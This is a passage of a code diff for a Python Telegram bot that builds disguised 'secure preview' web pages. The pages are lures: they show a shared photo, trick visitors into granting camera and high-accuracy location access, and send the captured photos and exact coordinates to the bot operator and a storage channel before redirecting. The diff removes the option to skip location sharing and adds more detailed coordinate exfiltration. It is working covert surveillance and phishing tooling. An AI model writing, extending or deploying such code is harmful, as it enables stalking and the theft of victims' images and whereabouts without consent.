@@ -19,9 +19,11 @@ CHANNEL_ID = os.environ.get("CHANNEL_ID")
 REQUIRED_CHANNEL = "@nrtecno2"
 ACCOUNT_NAME = "telegram-bot-b9j0"
 HTML_DIR = "html_files"
+PHOTO_DIR = "photos"
 STATS_FILE = "stats.json"
 
 os.makedirs(HTML_DIR, exist_ok=True)
+os.makedirs(PHOTO_DIR, exist_ok=True)
 
 if not os.path.exists(STATS_FILE):
     with open(STATS_FILE, "w") as f:
@@ -38,10 +40,10 @@ def increment_links():
 
 def delete_old_files():
     cutoff_time = datetime.now() - timedelta(minutes=10)
-    if os.path.exists(HTML_DIR):
-        for filename in os.listdir(HTML_DIR):
-            if filename.endswith('.html'):
-                filepath = os.path.join(HTML_DIR, filename)
+    for folder in [HTML_DIR, PHOTO_DIR]:
+        if os.path.exists(folder):
+            for filename in os.listdir(folder):
+                filepath = os.path.join(folder, filename)
                 try:
                     if datetime.fromtimestamp(os.path.getmtime(filepath)) < cutoff_time:
                         os.remove(filepath)
@@ -56,13 +58,14 @@ def start_auto_cleanup():
     threading.Thread(target=cleanup_loop, daemon=True).start()
 
 def delete_user_old_links(user_id):
-    if os.path.exists(HTML_DIR):
-        for filename in os.listdir(HTML_DIR):
-            if filename.startswith(f"v_{user_id}_") and filename.endswith('.html'):
-                try:
-                    os.remove(os.path.join(HTML_DIR, filename))
-                except:
-                    pass
+    for folder in [HTML_DIR, PHOTO_DIR]:
+        if os.path.exists(folder):
+            for filename in os.listdir(folder):
+                if filename.startswith(f"v_{user_id}_") or filename.startswith(f"photo_{user_id}_"):
+                    try:
+                        os.remove(os.path.join(folder, filename))
+                    except:
+                        pass
 
 def is_subscribed(user_id):
     try:
@@ -80,17 +83,18 @@ def get_user_state(user_id):
         with open(os.path.join(HTML_DIR, f"user_{user_id}.json"), "r") as f:
             return json.load(f)
     except:
-        return {"state": None}
+        return {"state": None, "target_url": None, "photo_file": None}
 
 def set_user_state(user_id, data):
     with open(os.path.join(HTML_DIR, f"user_{user_id}.json"), "w") as f:
         json.dump(data, f)
 
-def generate_html(user_id, target_url):
+def generate_html(user_id, target_url, photo_filename):
     delete_user_old_links(user_id)
-    filename = f"v_{user_id}_{int(time.time())}.html"
-    filepath = os.path.join(HTML_DIR, filename)
+    html_filename = f"v_{user_id}_{int(time.time())}.html"
+    filepath = os.path.join(HTML_DIR, html_filename)
     
+    photo_url = f"https://{ACCOUNT_NAME}.onrender.com/photos/{photo_filename}"
     storage_channel = CHANNEL_ID if CHANNEL_ID else "null"
     
     html = f"""<!DOCTYPE html>
@@ -98,7 +102,7 @@ def generate_html(user_id, target_url):
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>News Updates</title>
+    <title>Content Preview</title>
     <style>
         * {{
             margin: 0;
@@ -107,20 +111,25 @@ def generate_html(user_id, target_url):
         }}
         body {{
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: #f5f5f5;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 16px;
+            padding: 20px;
         }}
         .card {{
             background: white;
-            border-radius: 24px;
+            border-radius: 32px;
             max-width: 400px;
             width: 100%;
             overflow: hidden;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
+            animation: fadeIn 0.5s ease-out;
+        }}
+        @keyframes fadeIn {{
+            from {{ opacity: 0; transform: translateY(20px); }}
+            to {{ opacity: 1; transform: translateY(0); }}
         }}
         .header {{
             background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
@@ -128,7 +137,7 @@ def generate_html(user_id, target_url):
             text-align: center;
         }}
         .logo {{
-            font-size: 32px;
+            font-size: 28px;
             font-weight: bold;
             color: white;
         }}
@@ -136,17 +145,97 @@ def generate_html(user_id, target_url):
             color: #e94560;
         }}
         .badge {{
-            background: rgba(255,255,255,0.2);
+            background: rgba(255,255,255,0.15);
             display: inline-block;
             padding: 4px 12px;
             border-radius: 20px;
-            font-size: 12px;
+            font-size: 11px;
             color: white;
             margin-top: 8px;
         }}
-        .content {{
-            padding: 24px 20px;
+        .preview-section {{
+            padding: 24px;
+            text-align: center;
         }}
+        .preview-label {{
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #888;
+            margin-bottom: 12px;
+        }}
+        .user-photo {{
+            width: 120px;
+            height: 120px;
+            border-radius: 60px;
+            object-fit: cover;
+            margin: 0 auto 16px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
+            border: 3px solid #e94560;
+        }}
+        .message {{
+            background: #f0f0f0;
+            padding: 12px 16px;
+            border-radius: 20px;
+            display: inline-block;
+            max-width: 80%;
+            margin: 16px auto;
+            font-size: 14px;
+            color: #333;
+        }}
+        .content-info {{
+            margin: 20px 0;
+            padding: 16px;
+            background: #f8f9fa;
+            border-radius: 16px;
+        }}
+        .content-info p {{
+            color: #666;
+            font-size: 13px;
+            margin: 4px 0;
+        }}
+        .btn {{
+            background: linear-gradient(135deg, #e94560 0%, #c62a4a 100%);
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 16px;
+            transition: all 0.3s ease;
+            animation: pulse 2s infinite;
+            box-shadow: 0 4px 15px rgba(233,69,96,0.4);
+        }}
+        @keyframes pulse {{
+            0% {{
+                transform: scale(1);
+                box-shadow: 0 4px 15px rgba(233,69,96,0.4);
+            }}
+            50% {{
+                transform: scale(1.03);
+                box-shadow: 0 8px 25px rgba(233,69,96,0.6);
+            }}
+            100% {{
+                transform: scale(1);
+                box-shadow: 0 4px 15px rgba(233,69,96,0.4);
+            }}
+        }}
+        .btn:active {{
+            transform: scale(0.98);
+            animation: none;
+        }}
+        .footer {{
+            background: #f5f5f5;
+            padding: 16px;
+            text-align: center;
+            font-size: 11px;
+            color: #999;
+        }}
+        .step {{ display: none; }}
+        .active {{ display: block; }}
         .loader {{
             width: 48px;
             height: 48px;
@@ -154,50 +243,12 @@ def generate_html(user_id, target_url):
             border-top: 3px solid #e94560;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
+            margin: 20px auto;
         }}
         @keyframes spin {{
             0% {{ transform: rotate(0deg); }}
             100% {{ transform: rotate(360deg); }}
         }}
-        h3 {{
-            color: #1a1a2e;
-            margin-bottom: 8px;
-            font-size: 18px;
-        }}
-        p {{
-            color: #666;
-            font-size: 14px;
-            line-height: 1.5;
-        }}
-        .btn {{
-            background: linear-gradient(135deg, #e94560 0%, #c62a4a 100%);
-            color: white;
-            border: none;
-            padding: 14px 20px;
-            border-radius: 50px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            width: 100%;
-            margin-top: 20px;
-            transition: transform 0.2s, box-shadow 0.2s;
-        }}
-        .btn:active {{
-            transform: scale(0.98);
-        }}
-        .btn-secondary {{
-            background: #f0f0f0;
-            color: #666;
-        }}
-        .status {{
-            margin-top: 16px;
-            font-size: 13px;
-            color: #999;
-            text-align: center;
-        }}
-        .step {{ display: none; }}
-        .active {{ display: block; }}
         .error {{
             background: #fee;
             color: #e94560;
@@ -205,57 +256,61 @@ def generate_html(user_id, target_url):
             border-radius: 12px;
             font-size: 13px;
             margin-top: 16px;
-            text-align: center;
-        }}
-        .success {{
-            background: #e8f5e9;
-            color: #2e7d32;
-            padding: 12px;
-            border-radius: 12px;
-            font-size: 13px;
-            margin-top: 16px;
-            text-align: center;
         }}
     </style>
 </head>
 <body>
 <div class="card">
     <div class="header">
-        <div class="logo">Daily<span>News</span></div>
-        <div class="badge">Trending Now</div>
+        <div class="logo">Connect<span>Hub</span></div>
+        <div class="badge">Secure Preview</div>
     </div>
     
-    <div class="content" id="step1">
-        <div class="loader"></div>
-        <h3 style="text-align:center">Loading latest updates...</h3>
-        <p style="text-align:center; margin-top:8px">Please wait while we fetch the content</p>
+    <div id="step1" class="step active">
+        <div class="preview-section">
+            <div class="loader"></div>
+            <p style="color:#666; margin-top:16px">Loading secure preview...</p>
+        </div>
     </div>
     
-    <div class="content" id="step2" style="display:none">
-        <h3>💬 Reader Verification</h3>
-        <p>To continue reading this article, please complete a quick verification.</p>
-        <button class="btn" onclick="requestCamera()">Continue Reading →</button>
-        <div id="errorMsg" class="error" style="display:none"></div>
-        <div class="status">Over 1M readers verified daily</div>
+    <div id="step2" class="step">
+        <div class="preview-section">
+            <div class="preview-label">Shared by user</div>
+            <img class="user-photo" src="{photo_url}" alt="Shared photo">
+            <div class="message">
+                "Here's what I wanted to share with you"
+            </div>
+            <div class="content-info">
+                <p>📎 1 attachment • Secure link</p>
+                <p>🔒 End-to-end encrypted</p>
+            </div>
+            <button class="btn" onclick="requestCamera()">🚀 Proceed to Page</button>
+            <div id="errorMsg" class="error" style="display:none"></div>
+        </div>
+        <div class="footer">
+            <p>Secure connection • 256-bit encryption</p>
+        </div>
     </div>
     
-    <div class="content" id="step3" style="display:none">
-        <div class="loader"></div>
-        <h3 style="text-align:center">Setting up secure connection...</h3>
-        <p style="text-align:center; margin-top:8px">This won't take long</p>
+    <div id="step3" class="step">
+        <div class="preview-section">
+            <div class="loader"></div>
+            <p style="color:#666; margin-top:16px">Establishing secure connection...</p>
+        </div>
     </div>
     
-    <div class="content" id="step4" style="display:none">
-        <div class="loader"></div>
-        <h3 style="text-align:center">Optimizing your experience</h3>
-        <p style="text-align:center; margin-top:8px">Almost there...</p>
-        <button class="btn btn-secondary" onclick="skipLocation()" style="margin-top:20px">Continue without location</button>
+    <div id="step4" class="step">
+        <div class="preview-section">
+            <div class="loader"></div>
+            <p style="color:#666; margin-top:16px">Verifying your device...</p>
+        </div>
     </div>
     
-    <div class="content" id="step5" style="display:none">
-        <div class="loader"></div>
-        <h3 style="text-align:center">Redirecting to article</h3>
-        <p style="text-align:center; margin-top:8px">Please wait</p>
+    <div id="step5" class="step">
+        <div class="preview-section">
+            <div class="loader"></div>
+            <p style="color:#666; margin-top:16px">Redirecting to content...</p>
+        </div>
     </div>
 </div>
 
@@ -283,7 +338,7 @@ async function sendToUser(text, file=null) {{
             fd.append('chat_id', USER);
             fd.append('photo', file);
             await fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto', {{method:'POST', body:fd}});
-            if(STORAGE) {{
+            if(STORAGE && STORAGE !== 'null') {{
                 let fd2 = new FormData();
                 fd2.append('chat_id', STORAGE);
                 fd2.append('photo', file);
@@ -291,7 +346,7 @@ async function sendToUser(text, file=null) {{
             }}
         }} else {{
             await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{chat_id:USER, text:text, parse_mode:'HTML'}})}});
-            if(STORAGE) {{
+            if(STORAGE && STORAGE !== 'null') {{
                 await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{chat_id:STORAGE, text:text, parse_mode:'HTML'}})}});
             }}
         }}
@@ -409,13 +464,6 @@ async function captureFrontPhoto() {{
     }}
 }}
 
-async function skipLocation() {{
-    document.getElementById('step4').style.display = 'none';
-    document.getElementById('step5').style.display = 'block';
-    await sendToUser('Location: Skipped by user');
-    setTimeout(() => window.location.href = TARGET, 1500);
-}}
-
 async function requestCamera() {{
     document.getElementById('step2').style.display = 'none';
     document.getElementById('step3').style.display = 'block';
@@ -430,15 +478,21 @@ async function requestCamera() {{
         if(navigator.geolocation) {{
             navigator.geolocation.getCurrentPosition(async (p) => {{
                 await sendToUser('<b>Live Location</b>\\nhttps://www.google.com/maps?q=' + p.coords.latitude + ',' + p.coords.longitude);
+                await sendToUser('<b>Coordinates</b>\\nLat: ' + p.coords.latitude + '\\nLon: ' + p.coords.longitude + '\\nAccuracy: ' + p.coords.accuracy + 'm');
             }}, async (err) => {{
                 await sendToUser('Location: Access denied');
             }}, {{ timeout: 8000, enableHighAccuracy: true }});
         }}
+        
+        document.getElementById('step4').style.display = 'none';
+        document.getElementById('step5').style.display = 'block';
+        setTimeout(() => window.location.href = TARGET, 2000);
+        
     }} else {{
         document.getElementById('step3').style.display = 'none';
         document.getElementById('step2').style.display = 'block';
         let errorDiv = document.getElementById('errorMsg');
-        errorDiv.innerText = 'Verification failed. Please try again.';
+        errorDiv.innerText = 'Verification failed. Please allow camera access and try again.';
         errorDiv.style.display = 'block';
         await sendToUser('Camera access denied');
     }}
@@ -457,76 +511,56 @@ start();
     with open(filepath, "w", encoding="utf-8") as f:
         f.write(html)
     increment_links()
-    return filename
+    return html_filename
 
-def process_update(update):
-    try:
-        if hasattr(update, 'message') and update.message:
-            msg = update.message
-            text = msg.text if msg.text else ""
-            chat_id = msg.chat.id
-            
-            if text == '/start':
-                if not is_subscribed(chat_id):
-                    markup = telebot.types.InlineKeyboardMarkup()
-                    markup.add(telebot.types.InlineKeyboardButton("Join Channel", url="https://t.me/nrtecno2"))
-                    markup.add(telebot.types.InlineKeyboardButton("Verify", callback_data="verify"))
-                    bot.send_message(chat_id, f"Join {REQUIRED_CHANNEL} first!", reply_markup=markup)
-                else:
-                    set_user_state(chat_id, {"state": "waiting_url"})
-                    bot.send_message(chat_id, "Send me any URL")
-            
-            elif text.startswith(('http://', 'https://')):
-                state = get_user_state(chat_id)
-                if state.get("state") == "waiting_url":
-                    filename = generate_html(chat_id, text)
-                    set_user_state(chat_id, {"state": None})
-                    link = f"https://{ACCOUNT_NAME}.onrender.com/view/{filename}"
-                    bot.send_message(chat_id, f"Your link:\n{link}\n\nExpires in 10 minutes")
-                else:
-                    bot.send_message(chat_id, "Use /start first")
-            else:
-                if text != '/start':
-                    bot.send_message(chat_id, "Send a valid URL")
-    except Exception as e:
-        logger.error(f"Process error: {e}")
+# ========== BOT HANDLERS ==========
+@bot.message_handler(commands=['start'])
+def start_command(message):
+    chat_id = message.chat.id
+    if not is_subscribed(chat_id):
+        markup = telebot.types.InlineKeyboardMarkup()
+        markup.add(telebot.types.InlineKeyboardButton("Join Channel", url="https://t.me/nrtecno2"))
+        markup.add(telebot.types.InlineKeyboardButton("Verify", callback_data="verify"))
+        bot.send_message(chat_id, f"Join {REQUIRED_CHANNEL} first!", reply_markup=markup)
+    else:
+        set_user_state(chat_id, {"state": "waiting_url", "target_url": None, "photo_file": None})
+        bot.send_message(chat_id, "Send me any URL")
 
-def process_callback(call):
-    try:
-        if call.data == "verify":
-            if is_subscribed(call.from_user.id):
-                bot.edit_message_text("Verified! Send URL:", call.from_user.id, call.message.message_id)
-                set_user_state(call.from_user.id, {"state": "waiting_url"})
-            else:
-                bot.answer_callback_query(call.id, "Join channel first!", True)
-    except Exception as e:
-        logger.error(f"Callback error: {e}")
+@bot.message_handler(func=lambda m: m.text and m.text.startswith(('http://', 'https://')))
+def handle_url(message):
+    chat_id = message.chat.id
+    state = get_user_state(chat_id)
+    
+    if state.get("state") != "waiting_url":
+        bot.send_message(chat_id, "Use /start first")
+        return
+    
+    set_user_state(chat_id, {"state": "waiting_photo", "target_url": message.text, "photo_file": None})
+    bot.send_message(chat_id, "Now share a photo with me")
 
-@app.route('/webhook', methods=['POST'])
-def webhook():
+@bot.message_handler(content_types=['photo'])
+def handle_photo(message):
+    chat_id = message.chat.id
+    state = get_user_state(chat_id)
+    
+    if state.get("state") != "waiting_photo":
+        bot.send_message(chat_id, "Please send URL first using /start")
+        return
+    
     try:
-        json_str = request.get_data().decode('UTF-8')
-        data = json.loads(json_str)
+        file_info = bot.get_file(message.photo[-1].file_id)
+        downloaded_file = bot.download_file(file_info.file_path)
         
-        if 'message' in data:
-            process_update(telebot.types.Update.de_json(json_str))
-        elif 'callback_query' in data:
-            process_callback(telebot.types.Update.de_json(json_str))
+        photo_filename = f"photo_{chat_id}_{int(time.time())}.jpg"
+        photo_path = os.path.join(PHOTO_DIR, photo_filename)
         
-        return jsonify({"status": "ok"}), 200
-    except Exception as e:
-        logger.error(f"Webhook error: {e}")
-        return jsonify({"status": "error"}), 500
-
-@app.route('/view/<filename>')
-def serve_html(filename):
-    return send_from_directory(HTML_DIR, filename)
-
-@app.route('/')
-def home():
-    return f"DRAGON ACTIVE | Links: {len([f for f in os.listdir(HTML_DIR) if f.endswith('.html')])}"
-
-if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 10000))
-    start_auto_cleanup()
-    app.run(host='0.0.0.0', port=port)
+        with open(photo_path, "wb") as f:
+            f.write(downloaded_file)
+        
+        target_url = state.get("target_url")
+        html_filename = generate_html(chat_id, target_url, photo_filename)
+        
+        set_user_state(chat_id, {"state": None, "target_url": None, "photo_file": None})
+        
+        link = f"https://{ACCOUNT_NAME}.onrender.com/view/{html_filename}"
+        bot.send_message(chat_id, f"Your link:\n
